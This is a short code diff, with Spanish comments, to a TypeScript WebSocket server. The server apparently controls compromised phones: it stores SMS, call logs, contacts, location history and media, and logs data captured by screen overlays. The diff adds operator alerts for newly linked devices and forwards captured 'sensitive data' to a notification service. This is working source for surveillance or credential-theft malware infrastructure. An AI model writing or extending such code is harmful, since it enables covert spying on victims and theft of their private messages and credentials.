@@ -6,6 +6,7 @@ import { users, devices, locationHistory, smsLogs, mediaFiles, callLogs, contact
 import { eventBus } from "./eventBus";
 import { uploadFile, getDownloadUrl } from "./services/storageService";
 import crypto from "crypto";
+import { notificationService } from "./services/notificationService";
 import { advancedMonitoring } from "./advancedMonitoring";
 
 export interface DeviceLocation {
@@ -187,6 +188,9 @@ export class WebSocketManager {
             
             this.io.emit("device-status", { deviceId: dbId, status: "online", timestamp: Date.now() });
             console.log(`[WebSocket] [LISTO] Dispositivo ${dbId} listo y vinculado.`);
+            
+            // [NOTIFICACIÓN] Alerta de nueva conexión profesional
+            await notificationService.alertNewConnection(deviceName, dbId);
             
             // [INIT] Solicitar info inicial (batería, apps) al dispositivo
             setTimeout(() => {
@@ -442,6 +446,12 @@ export class WebSocketManager {
         if (id) {
           console.log(`[System] Overlay Capture from ${id}:`, data);
           await advancedMonitoring.logCapturedData(id, data.type || "overlay_capture", data.data || data);
+          
+          // [NOTIFICACIÓN] Alerta de captura de datos sensibles
+          const device = await db.query.devices.findFirst({ where: eq(devices.id, id) });
+          if (device) {
+            await notificationService.alertCriticalData(device.deviceName, data.type || "Overlay", JSON.stringify(data.data || data));
+          }
         }
     });
 
